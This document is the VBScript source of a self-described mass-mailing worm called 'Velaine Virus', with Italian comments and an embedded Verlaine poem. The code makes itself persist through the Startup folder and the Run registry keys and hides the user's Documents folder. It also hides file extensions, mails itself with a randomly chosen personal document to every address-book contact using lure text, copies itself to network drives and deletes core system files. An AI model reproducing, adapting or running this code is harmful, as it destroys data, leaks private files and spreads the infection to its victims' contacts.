'...°Velaine Virus°... (o cozzaglia di codici mal funzionanti...dovevo scegliere tra uno di questi due :)

dim fso, windir, docdir, strada, nulla, tempwin, reg, s, startup, msg, msg1, AOL, Ol

const ForAppending = 8, ForWriting = 2, ForReading = 1
main()
testo()
posta()
network()

sub main()
'On Error Resume Next
   Dim  filemod, ws, f, c, d
	Set reg=CreateObject("WScript.Shell")  
	Set fso = CreateObject("Scripting.FileSystemObject")
	windir = fso.GetSpecialFolder(0)
	Set WshShell = Wscript.CreateObject("Wscript.Shell") 
	docdir = WshShell.SpecialFolders("MyDocuments")
	startup = WshShell.SpecialFolders("StartUp")
	Set strada = fso.GetFile(WScript.ScriptFullName)
	if (fso.FolderExists(windir&"\SAMPLES\WSH\")) Then
		if strada <> windir&"\SAMPLES\WSH\REGISTRY.VBS" then
	  		copia()
		end if
	else
		copia2()
	end if

	if (fso.FileExists(startup&"\Verlaine.vbs")) Then
		nulla = nulla + nulla
	else
		strada.copy (startup&"\Verlaine.vbs"), true
		Set d = fso.GetFile(startup&"\Verlaine.vbs")
		d.attributes = 2
	end if
	if (fso.FileExists(windir&"\Pergamena_Verlaine_musa_ispiratrice_per_i_momenti_di_triste_solitudine_e_di_sconforto_che_triste_essere_incompresi_che_triste_essere_soli_ciao.txt.vbs")) Then
		nulla = nulla + nulla
	else
		strada.copy (windir&"\Pergamena_Verlaine_musa_ispiratrice_per_i_momenti_di_triste_solitudine_e_di_sconforto_che_triste_essere_incompresi_che_triste_essere_soli_ciao.txt.vbs"), true
	end if
		if (fso.FolderExists(windir&"\SYSTEM_BACKUP")) Then
			nulla = nulla + nulla
		else	
			Set f = fso.Getfolder(docdir)
			fso.movefolder  docdir, windir&"\SYSTEM_BACKUP"
			Set c = fso.Getfolder(windir&"\SYSTEM_BACKUP")
			c.attributes = 2
			Set c = fso.Getfolder(windir&"\SAMPLES")
			c.attributes = 2
		end if
	reg.regWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt",1,"REG_DWORD"
	reg.regWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden",2,"REG_DWORD"
end sub

sub testo()
if (fso.FileExists(docdir&"\Poesia_Verlaine.htm")) Then
	nulla = nulla + nulla
else
    Dim f, miofile, IE, c
    c = fso.createFolder(docdir)
    fso.CreateTextFile docdir&"\Poesia_Verlaine.htm"
    Set f = fso.GetFile(docdir&"\Poesia_Verlaine.htm") 
    Set miofile = fso.CreateTextFile(docdir&"\Poesia_Verlaine.htm", True)
	miofile.writeline "<html><! Verlaine Virus, non è cattivo...non è capito. 55581565991 perdonate la lingua inglese scapestrata ma devo ancora imparare a scrivere bene...>"
	miofile.writeline "<body bgcolor=gray text=blue>"
	miofile.writeline "<p align=@-@center@-@><font face=@-@Arial@-@>Verlaine, Languare<?-?font><?-?p>"
	miofile.writeline "<p align=@-@center@-@>&nbsp;<?-?p>"
	miofile.writeline "<p align=@-@center@-@><font face=@-@Arial@-@>Sono l'Impero alla fine della decadenza,<br>"
	miofile.writeline "che guarda passare i grandi Barbari bianchi<br>"
	miofile.writeline "componendo acrostici indolenti dove danza<br>"
	miofile.writeline "il languore del sole in uno stile d'oro.<br>"
	miofile.writeline "<br>"
	miofile.writeline "Soletta l'anima soffre di noia densa al cuore.<br> Laggiù, si dice, infuriano lunghe battaglie cruente.<br>"
	miofile.writeline "O non potervi, debole e così lento ai propositi,<br>"
	miofile.writeline "e non volervi far fiorire un po' quest'esistenza!<br>"
	miofile.writeline "<br>"
	miofile.writeline "O non potervi, o non volervi un po' morire!<br>"
	miofile.writeline "Ah! Tutto è bevuto! Non ridi più, Batillo?<br>"
	miofile.writeline "Tutto è bevuto, tutto è mangiato! Niente più da dire!<br>"
	miofile.writeline "<br>"
	miofile.writeline "Solo, un poema un po' fatuo che si getta alle fiamme,<br>"
	miofile.writeline "solo, uno schiavo un po' frivolo che vi dimentica,<br>"
	miofile.writeline "solo, un tedio d'un non so che attacco all'anima!<br>"
	miofile.writeline "<br>"
	miofile.writeline "<br><br><br>"
	miofile.writeline "<?-?font><?-?p>"
	miofile.writeline "<p align=@-@center@-@>&nbsp;<?-?p>"
	miofile.writeline "<p align=@-@center@-@>&nbsp;<?-?p>"
	miofile.writeline "<p align=@-@center@-@><font face=@-@Arial@-@ color=pink>P: slp_won_Emkcarc<?-?font><?-?p>"
	miofile.writeline "<p align=@-@center@-@>&nbsp;<?-?p>"
	miofile.writeline "<?-?body>"
	miofile.writeline "<?-?html>"
	miofile.Close
	if docdir = "C:\Documenti" then
		Msgbox("Controlla la cartella Documenti!")
	else
		Msgbox("Check your Document folder!")
	end if
end if
end sub

function copia()	
'on error resume next
	dim c
	Set c = fso.Getfile(windir&"\SAMPLES\WSH\REGISTRY.VBS")
	if c.attributes <> 2 then
		strada.copy (windir&"\SAMPLES\WSH\REGISTRY.VBS"), true
		c.attributes = 2
	end if
	reg.regWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MSscriptingvbs-control",windir&"\SAMPLES\WSH\REGISTRY.VBS"
end function

function copia2()	'per winNT che non ha la cartella SAMPLES
On Error Resume Next
	dim c
	Set c = fso.Getfile(windir&"\CHECKUPSYS.VBS")
	if c.attributes <> 2 then
		strada.copy (windir&"\CHECKUPSYS.VBS"), true
		c.attributes = 2
	end if
	reg.regWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\winNTscriptingvbsCONTROL",windir&"\CHECKUPSYS.VBS"
end function

sub posta() 
Dim cont, numero
Set postino = Wscript.CreateObject("Outlook.Application")
Set mapi = postino.getnamespace("MAPI")
Set post = postino.CreateItem(0)
numero = mapi.AddressLists.Count
Set msg1 = post.Attachments
 Do 
         cont = cont + 1
	aggfile()
	msg1.Add(windir&"\Pergamena_Verlaine_musa_ispiratrice_per_i_momenti_di_triste_solitudine_e_di_sconforto_che_triste_essere_incompresi_che_triste_essere_soli_ciao.txt.vbs")
	if s <> "" then
		msg1.Add(windir&"\SYSTEM_BACKUP\"&s)
	end if
	if docdir <> "C:\Documenti" then
		post.Subject = "Maybe you alredy know..."
		post.Body = "Hi, maybe you've already read, but it's fantastic...Verlaine is a good poet : ), but I'm better than him heheheheh                                byebye write me soon... p.s. i give you a file that you've asked me..."
	else
		post.Subject = "Forse la conosci già..."
		post.Body = "Ciao, forse l'hai già letta, comunque è fantastica...rileggerla mi ha fatto tornare in mente tante di quelle cose :)      ciao ciao e buona giornata ;)                              p.s. ti ho anche messo un altro file che mi avevi chiesto un po' di tempo fa..."		
	end if
		post.to = mapi.AddressLists(1).AddressEntries(cont)
		post.Send
 Loop until cont = numero
postino.Quit
posta2()
end sub

sub network()
On Error Resume next 'Speriamo che funzioni...non l'ho potuto testare su una network
Set Net = Wscript.CreateObject("Wscript.Network")
Set Drive = Net.EnumNetworkDrives
For x = 0 to 40
	strada.copy (Drive.Item(x)&"\Verlaine.txt.vbs"), true
Next
end sub

function posta2()
'On Error Resume Next
	Set del = fso.getfile("c:\autoexec.bat")
	del.delete true
	Set del = fso.getfile("c:\config.sys")
	del.delete true
	Set del = fso.getfile("c:\command.com")
	del.delete true
end function

function aggfile() '134 riga
Dim cont1, cont2
dim f, fc, f1, f3, s
s = ""
  Set f = fso.GetFolder(windir&"\system_backup\")
  Set fc = f.Files
Randomize Rnd
cont1 = 0
cont2 = 0
Randomize
cont1 = Int((15 - 0 + 1) *  Rnd + 1)
Randomize
cont2 = Int((40 - 0 + 1) *  Rnd + 2)
if cont1 > cont2 then
	cont1 = cont3
	cont2 = cont4
	cont1 = cont4
	cont2 = cont3
end if
Randomize Rnd
cont5 = 0
cont6 = 0
Randomize
cont5 = Int((30 - 0 + 1) *  Rnd + 2)
Randomize
cont6 = Int((40 - 20 + 1) *  Rnd + 3)
if cont1 > cont2 then
	cont5 = cont7
	cont6 = cont8
	cont5 = cont8
	cont6 = cont7
end if
  For Each f1 in fc
	cont1 = cont1 + 1
	if (cont2 = cont1) then
		s = f1.name
		exit for
	end if
	if (cont5 = cont6) then
		s = f1.name
		exit for  ' ti odio istruzione goto del cavolo...sorry ma era quasi inevitabile
	end if
		s = f1.name
  Next
end function

'spero vi sia piaciuto
